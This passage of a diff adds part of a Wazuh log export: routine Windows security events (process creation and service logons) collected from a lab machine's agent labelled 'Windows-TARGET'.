+                                "message": "\"A new process has been created.\r\n\r\nCreator Subject:\r\n\tSecurity ID:\t\tS-1-5-18\r\n\tAccount Name:\t\tWIN-C1OEL3I2PV8$\r\n\tAccount Domain:\t\tWORKGROUP\r\n\tLogon ID:\t\t0x3E7\r\n\r\nTarget Subject:\r\n\tSecurity ID:\t\tS-1-5-21-3827095766-909782368-2839298323-1001\r\n\tAccount Name:\t\tAmineMSc\r\n\tAccount Domain:\t\tWIN-C1OEL3I2PV8\r\n\tLogon ID:\t\t0x670C2\r\n\r\nProcess Information:\r\n\tNew Process ID:\t\t0x93c\r\n\tNew Process Name:\tC:\\Windows\\ImmersiveControlPanel\\SystemSettings.exe\r\n\tToken Elevation Type:\tTokenElevationTypeDefault (1)\r\n\tMandatory Label:\t\tS-1-16-12288\r\n\tCreator Process ID:\t0x3bc\r\n\tCreator Process Name:\tC:\\Windows\\System32\\svchost.exe\r\n\tProcess Command Line:\t\"C:\\Windows\\ImmersiveControlPanel\\SystemSettings.exe\" -ServerName:microsoft.windows.immersivecontrolpanel\r\n\r\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\r\n\r\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\r\n\r\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\r\n\r\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.\"",
+                                "version": "2",
+                                "systemTime": "2026-05-12T16:25:18.9893740Z",
+                                "eventRecordID": "29651",
+                                "threadID": "7212",
+                                "computer": "WIN-C1OEL3I2PV8",
+                                "task": "13312",
+                                "processID": "4",
+                                "severityValue": "AUDIT_SUCCESS",
+                                "providerName": "Microsoft-Windows-Security-Auditing"
+                            }
+                        }
+                    },
+                    "rule": {
+                        "firedtimes": 100,
+                        "mail": false,
+                        "level": 3,
+                        "description": "A process was created.",
+                        "groups": [
+                            "windows",
+                            " WEF"
+                        ],
+                        "id": "67027"
+                    },
+                    "decoder": {
+                        "name": "windows_eventchannel"
+                    },
+                    "full_log": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Security-Auditing\",\"providerGuid\":\"{54849625-5478-4994-a5ba-3e3b0328c30d}\",\"eventID\":\"4688\",\"version\":\"2\",\"level\":\"0\",\"task\":\"13312\",\"opcode\":\"0\",\"keywords\":\"0x8020000000000000\",\"systemTime\":\"2026-05-12T16:25:18.9893740Z\",\"eventRecordID\":\"29651\",\"processID\":\"4\",\"threadID\":\"7212\",\"channel\":\"Security\",\"computer\":\"WIN-C1OEL3I2PV8\",\"severityValue\":\"AUDIT_SUCCESS\",\"message\":\"\\\"A new process has been created.\\r\\n\\r\\nCreator Subject:\\r\\n\\tSecurity ID:\\t\\tS-1-5-18\\r\\n\\tAccount Name:\\t\\tWIN-C1OEL3I2PV8$\\r\\n\\tAccount Domain:\\t\\tWORKGROUP\\r\\n\\tLogon ID:\\t\\t0x3E7\\r\\n\\r\\nTarget Subject:\\r\\n\\tSecurity ID:\\t\\tS-1-5-21-3827095766-909782368-2839298323-1001\\r\\n\\tAccount Name:\\t\\tAmineMSc\\r\\n\\tAccount Domain:\\t\\tWIN-C1OEL3I2PV8\\r\\n\\tLogon ID:\\t\\t0x670C2\\r\\n\\r\\nProcess Information:\\r\\n\\tNew Process ID:\\t\\t0x93c\\r\\n\\tNew Process Name:\\tC:\\\\Windows\\\\ImmersiveControlPanel\\\\SystemSettings.exe\\r\\n\\tToken Elevation Type:\\tTokenElevationTypeDefault (1)\\r\\n\\tMandatory Label:\\t\\tS-1-16-12288\\r\\n\\tCreator Process ID:\\t0x3bc\\r\\n\\tCreator Process Name:\\tC:\\\\Windows\\\\System32\\\\svchost.exe\\r\\n\\tProcess Command Line:\\t\\\"C:\\\\Windows\\\\ImmersiveControlPanel\\\\SystemSettings.exe\\\" -ServerName:microsoft.windows.immersivecontrolpanel\\r\\n\\r\\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\\r\\n\\r\\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\\r\\n\\r\\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\\r\\n\\r\\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.\\\"\"},\"eventdata\":{\"subjectUserSid\":\"S-1-5-18\",\"subjectUserName\":\"WIN-C1OEL3I2PV8$\",\"subjectDomainName\":\"WORKGROUP\",\"subjectLogonId\":\"0x3e7\",\"newProcessId\":\"0x93c\",\"newProcessName\":\"C:\\\\\\\\Windows\\\\\\\\ImmersiveControlPanel\\\\\\\\SystemSettings.exe\",\"tokenElevationType\":\"%%1936\",\"processId\":\"0x3bc\",\"commandLine\":\"\\\\\\\"C:\\\\\\\\Windows\\\\\\\\ImmersiveControlPanel\\\\\\\\SystemSettings.exe\\\\\\\" -ServerName:microsoft.windows.immersivecontrolpanel\",\"targetUserSid\":\"S-1-5-21-3827095766-909782368-2839298323-1001\",\"targetUserName\":\"AmineMSc\",\"targetDomainName\":\"WIN-C1OEL3I2PV8\",\"targetLogonId\":\"0x670c2\",\"parentProcessName\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\svchost.exe\",\"mandatoryLabel\":\"S-1-16-12288\"}}}",
+                    "input": {
+                        "type": "log"
+                    },
+                    "@timestamp": "2026-05-12T16:25:20.362Z",
+                    "location": "EventChannel",
+                    "id": "1778603120.3303115",
+                    "timestamp": "2026-05-12T16:25:20.362+0000"
+                },
+                "sort": [
+                    1778603120362
+                ]
+            },
+            {
+                "_index": "wazuh-archives-4.x-2026.05.12",
+                "_id": "fhcBHZ4BTkZw-2444AOv",
+                "_score": null,
+                "_source": {
+                    "agent": {
+                        "ip": "192.168.64.6",
+                        "name": "Windows-TARGET",
+                        "id": "002"
+                    },
+                    "manager": {
+                        "name": "wazuh.manager"
+                    },
+                    "data": {
+                        "win": {
+                            "eventdata": {
+                                "subjectLogonId": "0x3e7",
+                                "parentProcessName": "C:\\\\Windows\\\\System32\\\\services.exe",
+                                "subjectDomainName": "WORKGROUP",
+                                "tokenElevationType": "%%1936",
+                                "newProcessId": "0x1cb8",
+                                "mandatoryLabel": "S-1-16-16384",
+                                "newProcessName": "C:\\\\Windows\\\\System32\\\\svchost.exe",
+                                "targetLogonId": "0x3e5",
+                                "targetUserName": "LOCAL SERVICE",
+                                "subjectUserSid": "S-1-5-18",
+                                "processId": "0x324",
+                                "targetDomainName": "NT AUTHORITY",
+                                "commandLine": "C:\\\\WINDOWS\\\\system32\\\\svchost.exe -k LocalService -p -s SstpSvc",
+                                "targetUserSid": "S-1-5-19",
+                                "subjectUserName": "WIN-C1OEL3I2PV8$"
+                            },
+                            "system": {
+                                "eventID": "4688",
+                                "keywords": "0x8020000000000000",
+                                "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
+                                "level": "0",
+                                "channel": "Security",
+                                "opcode": "0",
+                                "message": "\"A new process has been created.\r\n\r\nCreator Subject:\r\n\tSecurity ID:\t\tS-1-5-18\r\n\tAccount Name:\t\tWIN-C1OEL3I2PV8$\r\n\tAccount Domain:\t\tWORKGROUP\r\n\tLogon ID:\t\t0x3E7\r\n\r\nTarget Subject:\r\n\tSecurity ID:\t\tS-1-5-19\r\n\tAccount Name:\t\tLOCAL SERVICE\r\n\tAccount Domain:\t\tNT AUTHORITY\r\n\tLogon ID:\t\t0x3E5\r\n\r\nProcess Information:\r\n\tNew Process ID:\t\t0x1cb8\r\n\tNew Process Name:\tC:\\Windows\\System32\\svchost.exe\r\n\tToken Elevation Type:\tTokenElevationTypeDefault (1)\r\n\tMandatory Label:\t\tS-1-16-16384\r\n\tCreator Process ID:\t0x324\r\n\tCreator Process Name:\tC:\\Windows\\System32\\services.exe\r\n\tProcess Command Line:\tC:\\WINDOWS\\system32\\svchost.exe -k LocalService -p -s SstpSvc\r\n\r\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\r\n\r\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\r\n\r\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\r\n\r\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.\"",
+                                "version": "2",
+                                "systemTime": "2026-05-12T16:25:19.5936677Z",
+                                "eventRecordID": "29652",
+                                "threadID": "6964",
+                                "computer": "WIN-C1OEL3I2PV8",
+                                "task": "13312",
+                                "processID": "4",
+                                "severityValue": "AUDIT_SUCCESS",
+                                "providerName": "Microsoft-Windows-Security-Auditing"
+                            }
+                        }
+                    },
+                    "rule": {
+                        "firedtimes": 101,
+                        "mail": false,
+                        "level": 3,
+                        "description": "A process was created.",
+                        "groups": [
+                            "windows",
+                            " WEF"
+                        ],
+                        "id": "67027"
+                    },
+                    "decoder": {
+                        "name": "windows_eventchannel"
+                    },
+                    "full_log": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Security-Auditing\",\"providerGuid\":\"{54849625-5478-4994-a5ba-3e3b0328c30d}\",\"eventID\":\"4688\",\"version\":\"2\",\"level\":\"0\",\"task\":\"13312\",\"opcode\":\"0\",\"keywords\":\"0x8020000000000000\",\"systemTime\":\"2026-05-12T16:25:19.5936677Z\",\"eventRecordID\":\"29652\",\"processID\":\"4\",\"threadID\":\"6964\",\"channel\":\"Security\",\"computer\":\"WIN-C1OEL3I2PV8\",\"severityValue\":\"AUDIT_SUCCESS\",\"message\":\"\\\"A new process has been created.\\r\\n\\r\\nCreator Subject:\\r\\n\\tSecurity ID:\\t\\tS-1-5-18\\r\\n\\tAccount Name:\\t\\tWIN-C1OEL3I2PV8$\\r\\n\\tAccount Domain:\\t\\tWORKGROUP\\r\\n\\tLogon ID:\\t\\t0x3E7\\r\\n\\r\\nTarget Subject:\\r\\n\\tSecurity ID:\\t\\tS-1-5-19\\r\\n\\tAccount Name:\\t\\tLOCAL SERVICE\\r\\n\\tAccount Domain:\\t\\tNT AUTHORITY\\r\\n\\tLogon ID:\\t\\t0x3E5\\r\\n\\r\\nProcess Information:\\r\\n\\tNew Process ID:\\t\\t0x1cb8\\r\\n\\tNew Process Name:\\tC:\\\\Windows\\\\System32\\\\svchost.exe\\r\\n\\tToken Elevation Type:\\tTokenElevationTypeDefault (1)\\r\\n\\tMandatory Label:\\t\\tS-1-16-16384\\r\\n\\tCreator Process ID:\\t0x324\\r\\n\\tCreator Process Name:\\tC:\\\\Windows\\\\System32\\\\services.exe\\r\\n\\tProcess Command Line:\\tC:\\\\WINDOWS\\\\system32\\\\svchost.exe -k LocalService -p -s SstpSvc\\r\\n\\r\\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\\r\\n\\r\\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\\r\\n\\r\\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\\r\\n\\r\\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.\\\"\"},\"eventdata\":{\"subjectUserSid\":\"S-1-5-18\",\"subjectUserName\":\"WIN-C1OEL3I2PV8$\",\"subjectDomainName\":\"WORKGROUP\",\"subjectLogonId\":\"0x3e7\",\"newProcessId\":\"0x1cb8\",\"newProcessName\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\svchost.exe\",\"tokenElevationType\":\"%%1936\",\"processId\":\"0x324\",\"commandLine\":\"C:\\\\\\\\WINDOWS\\\\\\\\system32\\\\\\\\svchost.exe -k LocalService -p -s SstpSvc\",\"targetUserSid\":\"S-1-5-19\",\"targetUserName\":\"LOCAL SERVICE\",\"targetDomainName\":\"NT AUTHORITY\",\"targetLogonId\":\"0x3e5\",\"parentProcessName\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\services.exe\",\"mandatoryLabel\":\"S-1-16-16384\"}}}",
+                    "input": {
+                        "type": "log"
+                    },
+                    "@timestamp": "2026-05-12T16:25:20.363Z",
+                    "location": "EventChannel",
+                    "id": "1778603120.3309453",
+                    "timestamp": "2026-05-12T16:25:20.363+0000"
+                },
+                "sort": [
+                    1778603120363
+                ]
+            },
+            {
+                "_index": "wazuh-archives-4.x-2026.05.12",
+                "_id": "fxcBHZ4BTkZw-2444AOv",
+                "_score": null,
+                "_source": {
+                    "agent": {
+                        "ip": "192.168.64.6",
+                        "name": "Windows-TARGET",
+                        "id": "002"
+                    },
+                    "manager": {
+                        "name": "wazuh.manager"
+                    },
+                    "data": {
+                        "win": {
+                            "eventdata": {
+                                "subjectLogonId": "0x3e7",
+                                "parentProcessName": "C:\\\\Windows\\\\System32\\\\svchost.exe",
+                                "subjectDomainName": "WORKGROUP",
+                                "tokenElevationType": "%%1936",
+                                "newProcessId": "0x2230",
+                                "mandatoryLabel": "S-1-16-16384",
+                                "newProcessName": "C:\\\\Windows\\\\UUS\\\\Packages\\\\Preview\\\\arm64\\\\MoUsoCoreWorker.exe",
+                                "targetLogonId": "0x0",
+                                "subjectUserSid": "S-1-5-18",
+                                "processId": "0x2198",
+                                "commandLine": "\\\"C:\\\\WINDOWS\\\\uus\\\\packages\\\\preview\\\\ARM64\\\\MoUsoCoreWorker.exe\\\" useprivatenamespaces",
+                                "targetUserSid": "S-1-0-0",
+                                "subjectUserName": "WIN-C1OEL3I2PV8$"
+                            },
+                            "system": {
+                                "eventID": "4688",
+                                "keywords": "0x8020000000000000",
+                                "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
+                                "level": "0",
+                                "channel": "Security",
+                                "opcode": "0",
+                                "message": "\"A new process has been created.\r\n\r\nCreator Subject:\r\n\tSecurity ID:\t\tS-1-5-18\r\n\tAccount Name:\t\tWIN-C1OEL3I2PV8$\r\n\tAccount Domain:\t\tWORKGROUP\r\n\tLogon ID:\t\t0x3E7\r\n\r\nTarget Subject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nProcess Information:\r\n\tNew Process ID:\t\t0x2230\r\n\tNew Process Name:\tC:\\Windows\\UUS\\Packages\\Preview\\arm64\\MoUsoCoreWorker.exe\r\n\tToken Elevation Type:\tTokenElevationTypeDefault (1)\r\n\tMandatory Label:\t\tS-1-16-16384\r\n\tCreator Process ID:\t0x2198\r\n\tCreator Process Name:\tC:\\Windows\\System32\\svchost.exe\r\n\tProcess Command Line:\t\"C:\\WINDOWS\\uus\\packages\\preview\\ARM64\\MoUsoCoreWorker.exe\" useprivatenamespaces\r\n\r\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\r\n\r\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\r\n\r\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\r\n\r\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.\"",
+                                "version": "2",
+                                "systemTime": "2026-05-12T16:25:19.6067400Z",
+                                "eventRecordID": "29653",
+                                "threadID": "9504",
+                                "computer": "WIN-C1OEL3I2PV8",
+                                "task": "13312",
+                                "processID": "4",
+                                "severityValue": "AUDIT_SUCCESS",
+                                "providerName": "Microsoft-Windows-Security-Auditing"
+                            }
+                        }
+                    },
+                    "rule": {
+                        "firedtimes": 102,
+                        "mail": false,
+                        "level": 3,
+                        "description": "A process was created.",
+                        "groups": [
+                            "windows",
+                            " WEF"
+                        ],
+                        "id": "67027"
+                    },
+                    "decoder": {
+                        "name": "windows_eventchannel"
+                    },
+                    "full_log": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Security-Auditing\",\"providerGuid\":\"{54849625-5478-4994-a5ba-3e3b0328c30d}\",\"eventID\":\"4688\",\"version\":\"2\",\"level\":\"0\",\"task\":\"13312\",\"opcode\":\"0\",\"keywords\":\"0x8020000000000000\",\"systemTime\":\"2026-05-12T16:25:19.6067400Z\",\"eventRecordID\":\"29653\",\"processID\":\"4\",\"threadID\":\"9504\",\"channel\":\"Security\",\"computer\":\"WIN-C1OEL3I2PV8\",\"severityValue\":\"AUDIT_SUCCESS\",\"message\":\"\\\"A new process has been created.\\r\\n\\r\\nCreator Subject:\\r\\n\\tSecurity ID:\\t\\tS-1-5-18\\r\\n\\tAccount Name:\\t\\tWIN-C1OEL3I2PV8$\\r\\n\\tAccount Domain:\\t\\tWORKGROUP\\r\\n\\tLogon ID:\\t\\t0x3E7\\r\\n\\r\\nTarget Subject:\\r\\n\\tSecurity ID:\\t\\tS-1-0-0\\r\\n\\tAccount Name:\\t\\t-\\r\\n\\tAccount Domain:\\t\\t-\\r\\n\\tLogon ID:\\t\\t0x0\\r\\n\\r\\nProcess Information:\\r\\n\\tNew Process ID:\\t\\t0x2230\\r\\n\\tNew Process Name:\\tC:\\\\Windows\\\\UUS\\\\Packages\\\\Preview\\\\arm64\\\\MoUsoCoreWorker.exe\\r\\n\\tToken Elevation Type:\\tTokenElevationTypeDefault (1)\\r\\n\\tMandatory Label:\\t\\tS-1-16-16384\\r\\n\\tCreator Process ID:\\t0x2198\\r\\n\\tCreator Process Name:\\tC:\\\\Windows\\\\System32\\\\svchost.exe\\r\\n\\tProcess Command Line:\\t\\\"C:\\\\WINDOWS\\\\uus\\\\packages\\\\preview\\\\ARM64\\\\MoUsoCoreWorker.exe\\\" useprivatenamespaces\\r\\n\\r\\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\\r\\n\\r\\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\\r\\n\\r\\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\\r\\n\\r\\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.\\\"\"},\"eventdata\":{\"subjectUserSid\":\"S-1-5-18\",\"subjectUserName\":\"WIN-C1OEL3I2PV8$\",\"subjectDomainName\":\"WORKGROUP\",\"subjectLogonId\":\"0x3e7\",\"newProcessId\":\"0x2230\",\"newProcessName\":\"C:\\\\\\\\Windows\\\\\\\\UUS\\\\\\\\Packages\\\\\\\\Preview\\\\\\\\arm64\\\\\\\\MoUsoCoreWorker.exe\",\"tokenElevationType\":\"%%1936\",\"processId\":\"0x2198\",\"commandLine\":\"\\\\\\\"C:\\\\\\\\WINDOWS\\\\\\\\uus\\\\\\\\packages\\\\\\\\preview\\\\\\\\ARM64\\\\\\\\MoUsoCoreWorker.exe\\\\\\\" useprivatenamespaces\",\"targetUserSid\":\"S-1-0-0\",\"targetLogonId\":\"0x0\",\"parentProcessName\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\svchost.exe\",\"mandatoryLabel\":\"S-1-16-16384\"}}}",
+                    "input": {
+                        "type": "log"
+                    },
+                    "@timestamp": "2026-05-12T16:25:20.376Z",
+                    "location": "EventChannel",
+                    "id": "1778603120.3315385",
+                    "timestamp": "2026-05-12T16:25:20.376+0000"
+                },
+                "sort": [
+                    1778603120376
+                ]
+            },
+            {
+                "_index": "wazuh-archives-4.x-2026.05.12",
+                "_id": "gBcBHZ4BTkZw-2444AOv",
+                "_score": null,
+                "_source": {
+                    "agent": {
+                        "ip": "192.168.64.6",
+                        "name": "Windows-TARGET",
+                        "id": "002"
+                    },
+                    "manager": {
+                        "name": "wazuh.manager"
+                    },
+                    "data": {
+                        "win": {
+                            "eventdata": {
+                                "subjectLogonId": "0x3e7",
+                                "subjectDomainName": "WORKGROUP",
+                                "targetLinkedLogonId": "0x0",
+                                "impersonationLevel": "%%1833",
+                                "authenticationPackageName": "Negotiate",
+                                "targetLogonId": "0x3e7",
+                                "logonProcessName": "Advapi",
+                                "logonGuid": "{00000000-0000-0000-0000-000000000000}",
+                                "targetUserName": "SYSTEM",
+                                "keyLength": "0",
+                                "elevatedToken": "%%1842",
+                                "subjectUserSid": "S-1-5-18",
+                                "processId": "0x324",
+                                "processName": "C:\\\\Windows\\\\System32\\\\services.exe",
+                                "targetDomainName": "NT AUTHORITY",
+                                "targetUserSid": "S-1-5-18",
+                                "virtualAccount": "%%1843",
+                                "logonType": "5",
+                                "subjectUserName": "WIN-C1OEL3I2PV8$"
+                            },
+                            "system": {
+                                "eventID": "4624",
+                                "keywords": "0x8020000000000000",
+                                "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
+                                "level": "0",
+                                "channel": "Security",
+                                "opcode": "0",
+                                "message": "\"An account was successfully logged on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-18\r\n\tAccount Name:\t\tWIN-C1OEL3I2PV8$\r\n\tAccount Domain:\t\tWORKGROUP\r\n\tLogon ID:\t\t0x3E7\r\n\r\nLogon Information:\r\n\tLogon Type:\t\t5\r\n\tRestricted Admin Mode:\t-\r\n\tRemote Credential Guard:\t-\r\n\tVirtual Account:\t\tNo\r\n\tElevated Token:\t\tYes\r\n\r\nImpersonation Level:\t\tImpersonation\r\n\r\nNew Logon:\r\n\tSecurity ID:\t\tS-1-5-18\r\n\tAccount Name:\t\tSYSTEM\r\n\tAccount Domain:\t\tNT AUTHORITY\r\n\tLogon ID:\t\t0x3E7\r\n\tLinked Logon ID:\t\t0x0\r\n\tNetwork Account Name:\t-\r\n\tNetwork Account Domain:\t-\r\n\tLogon GUID:\t\t{00000000-0000-0000-0000-000000000000}\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x324\r\n\tProcess Name:\t\tC:\\Windows\\System32\\services.exe\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\t-\r\n\tSource Network Address:\t-\r\n\tSource Port:\t\t-\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tAdvapi  \r\n\tAuthentication Package:\tNegotiate\r\n\tTransited Services:\t-\r\n\tPackage Name (NTLM only):\t-\r\n\tKey Length:\t\t0\r\n\r\nThis event is generated when a logon session is created. It is generated on the computer that was accessed.\r\n\r\nThe subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\r\n\r\nThe logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).\r\n\r\nThe New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.\r\n\r\nThe network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.\r\n\r\nThe impersonation level field indicates the extent to which a process in the logon session can impersonate.\r\n\r\nThe authentication information fields provide detailed information about this specific logon request.\r\n\t- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.\r\n\t- Transited services indicate which intermediate services have participated in this logon request.\r\n\t- Package name indicates which sub-protocol was used among the NTLM protocols.\r\n\t- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.\"",
+                                "version": "3",
+                                "systemTime": "2026-05-12T16:25:19.7016502Z",
+                                "eventRecordID": "29658",
+                                "threadID": "4332",
+                                "computer": "WIN-C1OEL3I2PV8",
+                                "task": "12544",
+                                "processID": "824",
+                                "severityValue": "AUDIT_SUCCESS",
+                                "providerName": "Microsoft-Windows-Security-Auditing"
+                            }
+                        }
+                    },
+                    "decoder": {
+                        "name": "windows_eventchannel"
+                    },
+                    "full_log": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Security-Auditing\",\"providerGuid\":\"{54849625-5478-4994-a5ba-3e3b0328c30d}\",\"eventID\":\"4624\",\"version\":\"3\",\"level\":\"0\",\"task\":\"12544\",\"opcode\":\"0\",\"keywords\":\"0x8020000000000000\",\"systemTime\":\"2026-05-12T16:25:19.7016502Z\",\"eventRecordID\":\"29658\",\"processID\":\"824\",\"threadID\":\"4332\",\"channel\":\"Security\",\"computer\":\"WIN-C1OEL3I2PV8\",\"severityValue\":\"AUDIT_SUCCESS\",\"message\":\"\\\"An account was successfully logged on.\\r\\n\\r\\nSubject:\\r\\n\\tSecurity ID:\\t\\tS-1-5-18\\r\\n\\tAccount Name:\\t\\tWIN-C1OEL3I2PV8$\\r\\n\\tAccount Domain:\\t\\tWORKGROUP\\r\\n\\tLogon ID:\\t\\t0x3E7\\r\\n\\r\\nLogon Information:\\r\\n\\tLogon Type:\\t\\t5\\r\\n\\tRestricted Admin Mode:\\t-\\r\\n\\tRemote Credential Guard:\\t-\\r\\n\\tVirtual Account:\\t\\tNo\\r\\n\\tElevated Token:\\t\\tYes\\r\\n\\r\\nImpersonation Level:\\t\\tImpersonation\\r\\n\\r\\nNew Logon:\\r\\n\\tSecurity ID:\\t\\tS-1-5-18\\r\\n\\tAccount Name:\\t\\tSYSTEM\\r\\n\\tAccount Domain:\\t\\tNT AUTHORITY\\r\\n\\tLogon ID:\\t\\t0x3E7\\r\\n\\tLinked Logon ID:\\t\\t0x0\\r\\n\\tNetwork Account Name:\\t-\\r\\n\\tNetwork Account Domain:\\t-\\r\\n\\tLogon GUID:\\t\\t{00000000-0000-0000-0000-000000000000}\\r\\n\\r\\nProcess Information:\\r\\n\\tProcess ID:\\t\\t0x324\\r\\n\\tProcess Name:\\t\\tC:\\\\Windows\\\\System32\\\\services.exe\\r\\n\\r\\nNetwork Information:\\r\\n\\tWorkstation Name:\\t-\\r\\n\\tSource Network Address:\\t-\\r\\n\\tSource Port:\\t\\t-\\r\\n\\r\\nDetailed Authentication Information:\\r\\n\\tLogon Process:\\t\\tAdvapi  \\r\\n\\tAuthentication Package:\\tNegotiate\\r\\n\\tTransited Services:\\t-\\r\\n\\tPackage Name (NTLM only):\\t-\\r\\n\\tKey Length:\\t\\t0\\r\\n\\r\\nThis event is generated when a logon session is created. It is generated on the computer that was accessed.\\r\\n\\r\\nThe subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\\r\\n\\r\\nThe logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).\\r\\n\\r\\nThe New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.\\r\\n\\r\\nThe network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.\\r\\n\\r\\nThe impersonation level field indicates the extent to which a process in the logon session can impersonate.\\r\\n\\r\\nThe authentication information fields provide detailed information about this specific logon request.\\r\\n\\t- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.\\r\\n\\t- Transited services indicate which intermediate services have participated in this logon request.\\r\\n\\t- Package name indicates which sub-protocol was used among the NTLM protocols.\\r\\n\\t- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.\\\"\"},\"eventdata\":{\"subjectUserSid\":\"S-1-5-18\",\"subjectUserName\":\"WIN-C1OEL3I2PV8$\",\"subjectDomainName\":\"WORKGROUP\",\"subjectLogonId\":\"0x3e7\",\"targetUserSid\":\"S-1-5-18\",\"targetUserName\":\"SYSTEM\",\"targetDomainName\":\"NT AUTHORITY\",\"targetLogonId\":\"0x3e7\",\"logonType\":\"5\",\"logonProcessName\":\"Advapi\",\"authenticationPackageName\":\"Negotiate\",\"logonGuid\":\"{00000000-0000-0000-0000-000000000000}\",\"keyLength\":\"0\",\"processId\":\"0x324\",\"processName\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\services.exe\",\"impersonationLevel\":\"%%1833\",\"virtualAccount\":\"%%1843\",\"targetLinkedLogonId\":\"0x0\",\"elevatedToken\":\"%%1842\"}}}",
+                    "input": {
+                        "type": "log"
+                    },
+                    "@timestamp": "2026-05-12T16:25:20.396Z",
+                    "location": "EventChannel",
+                    "id": "1778603120.3315385",
+                    "timestamp": "2026-05-12T16:25:20.396+0000"
+                },
+                "sort": [
+                    1778603120396
+                ]
+            },
+            {
+                "_index": "wazuh-archives-4.x-2026.05.12",
+                "_id": "gRcBHZ4BTkZw-2444AOv",
+                "_score": null,
+                "_source": {
+                    "agent": {
+                        "ip": "192.168.64.6",
+                        "name": "Windows-TARGET",
+                        "id": "002"
+                    },
+                    "manager": {
+                        "name": "wazuh.manager"
+                    },
+                    "data": {
+                        "win": {
+                            "eventdata": {
+                                "subjectLogonId": "0x3e7",
+                                "subjectUserSid": "S-1-5-18",
+                                "subjectDomainName": "NT AUTHORITY",
